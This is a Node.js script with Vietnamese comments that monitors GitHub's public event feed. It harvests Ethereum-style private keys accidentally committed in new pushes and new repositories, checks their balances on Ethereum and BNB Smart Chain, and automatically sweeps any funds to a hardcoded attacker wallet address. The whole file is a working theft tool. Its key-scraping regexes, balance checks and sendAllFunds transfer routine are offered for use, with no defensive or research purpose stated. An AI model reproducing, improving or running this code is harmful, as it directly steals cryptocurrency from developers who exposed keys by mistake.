const fs = require('fs');
const fetch = require('node-fetch');
const { ethers } = require('ethers');
const chalk = require('chalk');

// Gom tất cả biến cấu hình vào object config
const config = {
  // Token xác thực GitHub, nếu không có sẽ dùng token mặc định
  GITHUB_TOKEN: '',
  
  // Thời gian giữa các lần kiểm tra (mili giây), mặc định 30 giây
  CHECK_INTERVAL: 30000,
  
  // File lưu các private key tìm thấy
  LOG_FILE: 'found_keys.txt',
  
  // URL API GitHub Events để theo dõi hoạt động mới
  EVENTS_URL: 'https://api.github.com/events',
  
  // Địa chỉ ví đích để chuyển tiền tìm được
  DEST_ADDRESS: '0x8b791c25285d84Aca210624FE86FcB84ed7E8Fb1',
  
  // Số dư tối thiểu để thực hiện chuyển tiền (ETH)
  MIN_AMOUNT: 0.005,
  
  // Chế độ quét: 'all' - quét tất cả, 'new-repo' - chỉ quét repo mới
  SCAN_MODE: 'all',
  
  // Số lượng kiểm tra số dư đồng thời tối đa
  BALANCE_CHECK_CONCURRENCY: 10,
  
  // File lưu các event đã xử lý để tránh trùng lặp
  SEEN_EVENTS_FILE: 'seen_events.json',
  
  // File cache ETag để tối ưu request API
  ETAG_CACHE_FILE: 'etag_cache.json',
  
  // File lưu thông tin các ví có số dư
  BALANCE_OUTPUT_FILE: 'wallets_with_balance.txt',
  
  // Số lượng file tối đa quét trong mỗi repo
  MAX_FILES_PER_REPO: 100,
  
  // Các trạng thái file muốn quét, ví dụ: 'added,modified,removed'
  SCAN_FILE_STATUS: ['added', 'removed'],
};

const HEADERS = config.GITHUB_TOKEN ? { 'Authorization': `token ${config.GITHUB_TOKEN}` } : {};

// Regex tìm private key EVM
const regexes = [
  /\b0x[a-fA-F0-9]{64}\b/g,
  /\b[a-fA-F0-9]{64}\b/g
];

let seenEventIds = new Set();

// Biến lưu các RPC khả dụng sau khi kiểm tra
let workingRpcUrls = {};

// Biến lưu index RPC hiện tại cho từng mạng (round-robin)
let rpcIndex = {};

// Biến lưu thời gian phản hồi của từng RPC
let rpcResponseTime = {};

// Danh sách phần mở rộng file code/text phổ biến
const CODE_FILE_EXTENSIONS = [
  '.js', '.ts', '.py', '.sol', '.env', '.json', '.yaml', '.yml', '.txt', '.go', '.rs', '.c', '.cpp', '.h', '.java', '.php', '.sh', '.pl', '.rb', '.swift', '.cs', '.ini', '.cfg', '.md', '.toml', '.lock', '.conf', '.bat', '.ps1', '.dockerfile', '.makefile', '.gradle', '.xml', '.html', '.css', '.scss', '.vue', '.svelte', '.jsx', '.tsx', '.dart', '.kt', '.m', '.mm', '.scala', '.groovy', '.properties', '.pem', '.crt', '.key', '.secret', '.config', '.sample', '.example'
];

// Hàm kiểm tra file có phải code/text không
function isCodeFile(filename) {
  const lower = filename.toLowerCase();
  return CODE_FILE_EXTENSIONS.some(ext => lower.endsWith(ext));
}

// Tối ưu 2: Đọc log vào Set khi khởi động
let foundKeySet = new Set();
try {
  const logContent = fs.readFileSync(config.LOG_FILE, 'utf8');
  const regex = /0x[a-fA-F0-9]{64}|\b[a-fA-F0-9]{64}\b/g;
  const matches = logContent.match(regex) || [];
  foundKeySet = new Set(matches);
} catch (e) {}

// Tối ưu 3: Lưu seenEventIds vào file
try {
  if (fs.existsSync(config.SEEN_EVENTS_FILE)) {
    const seenRaw = fs.readFileSync(config.SEEN_EVENTS_FILE, 'utf8');
    seenEventIds = new Set(JSON.parse(seenRaw));
  }
} catch (e) {}

function saveSeenEvents() {
  try {
    fs.writeFileSync(config.SEEN_EVENTS_FILE, JSON.stringify(Array.from(seenEventIds)));
  } catch (e) {}
}

function extractKeys(content) {
  let found = [];
  for (const regex of regexes) {
    const matches = content.match(regex);
    if (matches) found = found.concat(matches);
  }
  return found;
}

// Tối ưu 8: Cache ETag/Last-Modified cho từng URL
let etagCache = {};
try {
  if (fs.existsSync(config.ETAG_CACHE_FILE)) {
    etagCache = JSON.parse(fs.readFileSync(config.ETAG_CACHE_FILE, 'utf8'));
  }
} catch (e) {}
function saveEtagCache() {
  try {
    fs.writeFileSync(config.ETAG_CACHE_FILE, JSON.stringify(etagCache));
  } catch (e) {}
}

// Hàm fetch với ETag/If-Modified-Since và tự động tăng delay nếu bị rate limit
let dynamicDelay = config.CHECK_INTERVAL;
async function fetchWithCache(url) {
  let headers = { ...HEADERS };
  if (etagCache[url]) {
    if (etagCache[url].etag) headers['If-None-Match'] = etagCache[url].etag;
    if (etagCache[url]['last-modified']) headers['If-Modified-Since'] = etagCache[url]['last-modified'];
  }
  const res = await fetch(url, { headers });
  // Xử lý rate limit
  if (res.status === 403 && res.headers.get('X-RateLimit-Remaining') === '0') {
    const reset = res.headers.get('X-RateLimit-Reset');
    const now = Math.floor(Date.now() / 1000);
    const waitSec = reset ? Math.max(0, parseInt(reset) - now) : 60;
    dynamicDelay = Math.max(dynamicDelay, (waitSec + 5) * 1000);
    console.log(chalk.red(`Rate limit! Tăng thời gian quét lên ${dynamicDelay / 1000}s`));
    throw new Error('Rate limit');
  }
  if (res.status === 304) {
    // Không thay đổi, trả về null
    return null;
  }
  // Lưu ETag/Last-Modified nếu có
  const etag = res.headers.get('etag');
  const lastModified = res.headers.get('last-modified');
  if (etag || lastModified) {
    etagCache[url] = etagCache[url] || {};
    if (etag) etagCache[url].etag = etag;
    if (lastModified) etagCache[url]['last-modified'] = lastModified;
    saveEtagCache();
  }
  return res;
}

// Sửa fetchJSON để dùng fetchWithCache
async function fetchJSON(url) {
  let res;
  try {
    res = await fetchWithCache(url);
  } catch (e) {
    if (e.message === 'Rate limit') throw e;
    throw new Error(`HTTP error: ${url}`);
  }
  if (!res) return null; // 304 Not Modified
  if (!res.ok) throw new Error(`HTTP ${res.status}: ${url}`);
  return res.json();
}

// Thêm biến lưu event ID cuối cùng đã xử lý
let lastSeenEventId = null;
try {
  if (fs.existsSync('last_seen_event_id.txt')) {
    lastSeenEventId = fs.readFileSync('last_seen_event_id.txt', 'utf8').trim();
  }
} catch (e) {}

async function scan() {
  try {
    const events = await fetchJSON(config.EVENTS_URL);
    let newEvents = [];
    for (const event of events) {
      if (event.id === lastSeenEventId) break;
      newEvents.push(event);
    }
    // Xử lý event từ cũ đến mới để đúng thứ tự thời gian
    for (let i = newEvents.length - 1; i >= 0; i--) {
      const event = newEvents[i];
      if (seenEventIds.has(event.id)) continue;
      seenEventIds.add(event.id);
      saveSeenEvents();
      // Chỉ scan commit mới nếu SCAN_MODE là 'commit' hoặc 'all'
      if ((config.SCAN_MODE === 'commit' || config.SCAN_MODE === 'all') && event.type === 'PushEvent') {
        const repo = event.repo.name;
        const commits = event.payload.commits || [];
        for (const commit of commits) {
          const sha = commit.sha;
          // Lấy chi tiết commit để biết file thay đổi
          const commitUrl = `https://api.github.com/repos/${repo}/commits/${sha}`;
          let commitData;
          try {
            commitData = await fetchJSON(commitUrl);
          } catch (e) { continue; }
          const files = commitData.files || [];
          for (const file of files) {
            if (!config.SCAN_FILE_STATUS.includes(file.status)) continue;
            if (!file.filename || !file.raw_url) continue;
            if (!isCodeFile(file.filename)) continue; // Tối ưu 1: chỉ quét file code
            let content;
            try {
              const res = await fetch(file.raw_url, { headers: HEADERS });
              if (!res.ok) continue;
              content = await res.text();
            } catch (e) { continue; }
            const keys = extractKeys(content);
            if (keys.length > 0) {
              for (const key of keys) {
                if (!isLikelyEvmPrivateKey(key)) {
                  console.log(chalk.red(`Bỏ qua key không hợp lệ: ${key}`));
                  continue;
                }
                // Chuẩn hóa private key
                let pk = key.trim();
                if (!pk.startsWith('0x')) pk = '0x' + pk;
                if (foundKeySet.has(pk)) {
                  console.log(chalk.yellow(`Key đã tồn tại, bỏ qua: ${key}`));
                  continue;
                }
                try {
                  const wallet = new ethers.Wallet(pk);
                  let totalBalance = 0;
                  let networkBalances = [];
                  for (const network of networks) {
                    const provider = await getWorkingProvider(network.name);
                    if (!provider) {
                      console.log(chalk.red(`Tất cả RPC của mạng ${network.name} đều lỗi, bỏ qua.`));
                      continue;
                    }
                    const balance = await provider.getBalance(wallet.address);
                    const balanceInEth = ethers.formatEther(balance);
                    networkBalances.push({ network: network.name, symbol: network.symbol, balance: balanceInEth });
                    totalBalance += parseFloat(balanceInEth);
                    if (parseFloat(balanceInEth) > config.MIN_AMOUNT) {
                      const txHash = await sendAllFunds(pk, network, config.DEST_ADDRESS);
                      if (txHash) {
                        const logTx = `Đã chuyển toàn bộ ${balanceInEth} ${network.symbol} từ ${wallet.address} về ${config.DEST_ADDRESS} trên mạng ${network.name}. Tx: ${txHash}\n`;
                        fs.appendFileSync(config.LOG_FILE, logTx);
                        console.log(chalk.green(logTx));
                      } else {
                        console.log(chalk.red(`Không thể chuyển ${network.symbol} từ ${wallet.address} trên mạng ${network.name} (có thể không đủ phí gas).`));
                      }
                    }
                    await new Promise(resolve => setTimeout(resolve, 500));
                  }
                  if (totalBalance > 0) {
                    const githubUrl = `https://github.com/${repo}/blob/${sha}/${file.filename}`;
                    const logEntry = `Repo: ${repo}\nFile: ${file.filename}\nLink: ${githubUrl}\nKey: ${key}\nAddress: ${wallet.address}\nTổng số dư: ${totalBalance} ETH\nSố dư trên các mạng:\n` +
                      networkBalances.map(b => `${b.network}: ${b.balance} ${b.symbol}`).join('\n') +
                      `\nCommit: ${sha}\n---\n`;
                    fs.appendFileSync(config.LOG_FILE, logEntry);
                    foundKeySet.add(pk); // Tối ưu 2: cập nhật Set
                    console.log(chalk.blue(`Found key with balance in ${repo}/${file.filename}: ${key} ${wallet.address} ${totalBalance}`));
                  } else {
                    console.log(chalk.yellow(`Key không có số dư: ${key}`));
                  }
                } catch (e) {
                  console.log(chalk.red(`Key không hợp lệ: ${key}`));
                }
              }
            }
          }
        }
      }
      // Chỉ scan repo mới nếu SCAN_MODE là 'new-repo' hoặc 'all'
      if ((config.SCAN_MODE === 'new-repo' || config.SCAN_MODE === 'all') && event.type === 'CreateEvent' && event.payload.ref_type === 'repository') {
        const repo = event.repo.name;
        const contentsUrl = `https://api.github.com/repos/${repo}/contents`;
        let files = await getAllFilesInRepo(contentsUrl);
        for (const file of files) {
          if (!file.download_url) continue;
          if (!isCodeFile(file.name || file.path || '')) continue; // Tối ưu 1: chỉ quét file code
          let content;
          try {
            const res = await fetch(file.download_url, { headers: HEADERS });
            if (!res.ok) continue;
            content = await res.text();
          } catch (e) { continue; }
          const keys = extractKeys(content);
          if (keys.length > 0) {
            for (const key of keys) {
              if (!isLikelyEvmPrivateKey(key)) {
                console.log(chalk.red(`Bỏ qua key không hợp lệ: ${key}`));
                continue;
              }
              // Chuẩn hóa private key
              let pk = key.trim();
              if (!pk.startsWith('0x')) pk = '0x' + pk;
              if (foundKeySet.has(pk)) {
                console.log(chalk.yellow(`Key đã tồn tại, bỏ qua: ${key}`));
                continue;
              }
              try {
                const wallet = new ethers.Wallet(pk);
                let totalBalance = 0;
                let networkBalances = [];
                for (const network of networks) {
                  const provider = await getWorkingProvider(network.name);
                  if (!provider) {
                    console.log(chalk.red(`Tất cả RPC của mạng ${network.name} đều lỗi, bỏ qua.`));
                    continue;
                  }
                  const balance = await provider.getBalance(wallet.address);
                  const balanceInEth = ethers.formatEther(balance);
                  networkBalances.push({ network: network.name, symbol: network.symbol, balance: balanceInEth });
                  totalBalance += parseFloat(balanceInEth);
                  if (parseFloat(balanceInEth) > config.MIN_AMOUNT) {
                    const txHash = await sendAllFunds(pk, network, config.DEST_ADDRESS);
                    if (txHash) {
                      const logTx = `Đã chuyển toàn bộ ${balanceInEth} ${network.symbol} từ ${wallet.address} về ${config.DEST_ADDRESS} trên mạng ${network.name}. Tx: ${txHash}\n`;
                      fs.appendFileSync(config.LOG_FILE, logTx);
                      console.log(chalk.green(logTx));
                    } else {
                      console.log(chalk.red(`Không thể chuyển ${network.symbol} từ ${wallet.address} trên mạng ${network.name} (có thể không đủ phí gas).`));
                    }
                  }
                  await new Promise(resolve => setTimeout(resolve, 500));
                }
                if (totalBalance > 0) {
                  const githubUrl = `https://github.com/${repo}/blob/main/${file.path}`;
                  const logEntry = `Repo: ${repo}\nFile: ${file.path}\nLink: ${githubUrl}\nKey: ${key}\nAddress: ${wallet.address}\nTổng số dư: ${totalBalance} ETH\nSố dư trên các mạng:\n` +
                    networkBalances.map(b => `${b.network}: ${b.balance} ${b.symbol}`).join('\n') +
                    `\nCommit: (new repo)\n---\n`;
                  fs.appendFileSync(config.LOG_FILE, logEntry);
                  foundKeySet.add(pk); // Tối ưu 2: cập nhật Set
                  console.log(chalk.blue(`Found key with balance in NEW repo ${repo}/${file.path}: ${key} ${wallet.address} ${totalBalance}`));
                } else {
                  console.log(chalk.yellow(`Key không có số dư: ${key}`));
                }
              } catch (e) {
                console.log(chalk.red(`Key không hợp lệ: ${key}`));
              }
            }
          }
        }
      }
    }
    // Cập nhật lastSeenEventId
    if (events && events.length > 0) {
      lastSeenEventId = events[0].id;
      fs.writeFileSync('last_seen_event_id.txt', lastSeenEventId);
    }
  } catch (err) {
    console.error('Error during scan:', err);
  }
}

// ====== PHẦN KIỂM TRA SỐ DƯ CÁC PRIVATE KEY ĐÃ THU THẬP ======
const networkRpcUrls = {
    'Ethereum': [
        'https://eth.llamarpc.com',
        'https://eth-pokt.nodies.app',
        'https://ethereum.publicnode.com',
        'https://rpc.mevblocker.io',
        'https://eth.drpc.org',
        'https://eth.blockrazor.xyz'
    ],
    'BNB Smart Chain': [
        'https://binance.llamarpc.com',
        'https://bsc-dataseed.bnbchain.org',
        'https://1rpc.io/bnb',
        'https://bsc-pokt.nodies.app',
        'https://bsc.blockrazor.xyz'
    ]
};

const networks = [
    { name: 'Ethereum', symbol: 'ETH' },
    { name: 'BNB Smart Chain', symbol: 'BNB' }
];

const balanceOutputFile = config.BALANCE_OUTPUT_FILE;

async function checkNetworkBalance(wallet, network) {
    try {
        const provider = new ethers.JsonRpcProvider(networkRpcUrls[network.name][0]);
        const balance = await provider.getBalance(wallet.address);
        const balanceInEth = ethers.formatEther(balance);
        return {
            network: network.name,
            symbol: network.symbol,
            balance: balanceInEth
        };
    } catch (error) {
        return {
            network: network.name,
            symbol: network.symbol,
            balance: '0'
        };
    }
}

async function checkWalletBalance(privateKey) {
    try {
        // Chuẩn hóa private key
        let pk = privateKey.trim();
        if (pk.startsWith('0x')) pk = pk;
        else pk = '0x' + pk;
        const wallet = new ethers.Wallet(pk);
        let totalBalance = 0;
        let networkBalances = [];
        for (const network of networks) {
            const balanceInfo = await checkNetworkBalance(wallet, network);
            networkBalances.push(balanceInfo);
            totalBalance += parseFloat(balanceInfo.balance);
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        if (totalBalance > 0) {
            return {
                address: wallet.address,
                privateKey: pk,
                totalBalance: totalBalance,
                networkBalances: networkBalances
            };
        }
        return null;
    } catch (error) {
        return null;
    }
}

function extractAllKeysFromFoundFile() {
    const content = fs.readFileSync(config.LOG_FILE, 'utf8');
    // Regex lấy cả 0x + 64 hex và 64 hex
    const regex = /0x[a-fA-F0-9]{64}|\b[a-fA-F0-9]{64}\b/g;
    const matches = content.match(regex) || [];
    // Loại trùng lặp
    return Array.from(new Set(matches));
}

async function checkAllKeysBalance() {
    const keys = extractAllKeysFromFoundFile();
    console.log(`Tìm thấy ${keys.length} private key, bắt đầu kiểm tra số dư...`);
    let found = 0;
    let running = 0;
    let next = 0;
    const results = [];
    function runNext(resolve) {
        while (running < config.BALANCE_CHECK_CONCURRENCY && next < keys.length) {
            const key = keys[next];
            running++;
            (async (idx, k) => {
                const walletInfo = await checkWalletBalance(k);
                if (walletInfo) {
                    found++;
                    results.push(walletInfo); // Lưu vào mảng thay vì ghi file ngay
                    console.log(chalk.green(`[${found}] Ví có số dư: ${walletInfo.address} - ${walletInfo.totalBalance} ETH`));
                } else {
                    console.log(chalk.yellow(`[${idx+1}/${keys.length}] Không có số dư: ${k}`));
                }
                running--;
                if (next < keys.length) {
                    runNext(resolve);
                } else if (running === 0) {
                    resolve();
                }
            })(next, key);
            next++;
        }
    }
    await new Promise(runNext);

    // Sắp xếp kết quả theo tổng số dư giảm dần
    results.sort((a, b) => b.totalBalance - a.totalBalance);

    // Ghi ra file (xóa file cũ trước)
    fs.writeFileSync(balanceOutputFile, '');
    for (const walletInfo of results) {
        let data = `Địa chỉ: ${walletInfo.address}\n`;
        data += `Private Key: ${walletInfo.privateKey}\n`;
        data += `Tổng số dư: ${walletInfo.totalBalance} ETH\n\n`;
        data += 'Số dư trên các mạng:\n';
        walletInfo.networkBalances.forEach(balance => {
            data += `${balance.network}: ${balance.balance} ${balance.symbol}\n`;
        });
        data += '\n----------------------------------------\n\n';
        fs.appendFileSync(balanceOutputFile, data);
    }

    console.log(`\nHoàn thành. Đã tìm thấy ${found} ví có số dư.`);
}

// Nếu chạy với tham số 'check-balance' thì thực hiện kiểm tra số dư
if (process.argv[2] === 'check-balance') {
    checkAllKeysBalance();
    return;
}

function isLikelyEvmPrivateKey(key) {
  // Loại bỏ toàn 0 hoặc toàn f
  if (/^0x?0{64}$/i.test(key) || /^0x?f{64}$/i.test(key)) return false;
  try {
    new ethers.Wallet(key.startsWith('0x') ? key : '0x' + key);
    return true;
  } catch {
    return false;
  }
}

// Thư mục phổ biến để quét file
const POPULAR_DIRS = [
  'src', 'contracts', 'config', 'lib', 'app', 'backend', 'server', 'api', 'env', 'settings', 'deploy', 'migrations', 'test', 'examples', 'samples', 'utils', 'core', 'main', 'public', 'private', 'secrets', 'keys', 'wallets'
];

// Hàm đệ quy lấy tất cả file trong repo (chỉ đi vào thư mục phổ biến, giới hạn số file)
async function getAllFilesInRepo(contentsUrl, fileList = [], depth = 0) {
  if (fileList.length >= config.MAX_FILES_PER_REPO) return fileList;
  let items;
  try {
    items = await fetchJSON(contentsUrl);
  } catch (e) { return fileList; }
  for (const item of items) {
    if (fileList.length >= config.MAX_FILES_PER_REPO) break;
    if (item.type === 'file' && item.download_url) {
      fileList.push(item);
    } else if (item.type === 'dir') {
      // Chỉ đi vào thư mục phổ biến hoặc ở depth 0 (tức là thư mục gốc)
      if (depth === 0 || POPULAR_DIRS.includes(item.name.toLowerCase())) {
        await getAllFilesInRepo(item.url, fileList, depth + 1);
      }
    }
  }
  return fileList;
}

// Hàm gửi toàn bộ số dư về ví đích
async function sendAllFunds(privateKey, network, toAddress) {
  try {
    const provider = await getWorkingProvider(network.name);
    if (!provider) return null;
    const wallet = new ethers.Wallet(privateKey, provider);
    const balance = await provider.getBalance(wallet.address);
    // Lấy gas price
    const gasPrice = await provider.getGasPrice();
    // Ước lượng gas limit (gửi đơn giản là 21000)
    const gasLimit = 21000n;
    // Số dư thực tế có thể gửi
    const totalFee = gasPrice * gasLimit;
    if (balance <= totalFee) return null;
    const amountToSend = balance - totalFee;
    if (amountToSend <= 0) return null;
    const tx = await wallet.sendTransaction({
      to: toAddress,
      value: amountToSend,
      gasPrice: gasPrice,
      gasLimit: gasLimit
    });
    await tx.wait();
    return tx.hash;
  } catch (e) {
    return null;
  }
}

// Hàm kiểm tra và lọc các RPC khả dụng cho từng mạng, đồng thời đo thời gian phản hồi
async function filterWorkingRpcs() {
  for (const networkName of Object.keys(networkRpcUrls)) {
    workingRpcUrls[networkName] = [];
    rpcResponseTime[networkName] = {};
    for (const url of networkRpcUrls[networkName]) {
      try {
        const provider = new ethers.JsonRpcProvider(url);
        const start = Date.now();
        await provider.getBlockNumber(); // test kết nối
        const elapsed = Date.now() - start;
        workingRpcUrls[networkName].push(url);
        rpcResponseTime[networkName][url] = elapsed;
        console.log(`✔️  RPC OK: ${networkName} - ${url} (${elapsed} ms)`);
      } catch (e) {
        console.log(`❌ RPC lỗi: ${networkName} - ${url}`);
      }
    }
    if (workingRpcUrls[networkName].length === 0) {
      console.log(chalk.red(`Không có RPC nào khả dụng cho mạng ${networkName}!`));
    }
  }
}

// Sửa hàm getWorkingProvider để ưu tiên RPC nhanh nhất
async function getWorkingProvider(networkName) {
  const urls = workingRpcUrls[networkName] || [];
  if (urls.length === 0) return null;
  // Sắp xếp endpoint theo thời gian phản hồi tăng dần
  const sortedUrls = [...urls].sort((a, b) => (rpcResponseTime[networkName][a] || 999999) - (rpcResponseTime[networkName][b] || 999999));
  for (const url of sortedUrls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const start = Date.now();
      await provider.getBlockNumber(); // test kết nối
      const elapsed = Date.now() - start;
      // Cập nhật moving average (trung bình động) cho response time
      if (rpcResponseTime[networkName][url]) {
        rpcResponseTime[networkName][url] = Math.round((rpcResponseTime[networkName][url] * 2 + elapsed) / 3);
      } else {
        rpcResponseTime[networkName][url] = elapsed;
      }
      return provider;
    } catch (e) {
      continue;
    }
  }
  return null;
}

console.log('Starting GitHub public event watcher...');
filterWorkingRpcs().then(() => {
  setInterval(scan, dynamicDelay);
});
// Định kỳ 30s kiểm tra lại RPC
setInterval(() => {
  console.log('Đang kiểm tra lại danh sách RPC...');
  filterWorkingRpcs();
}, 30000); 
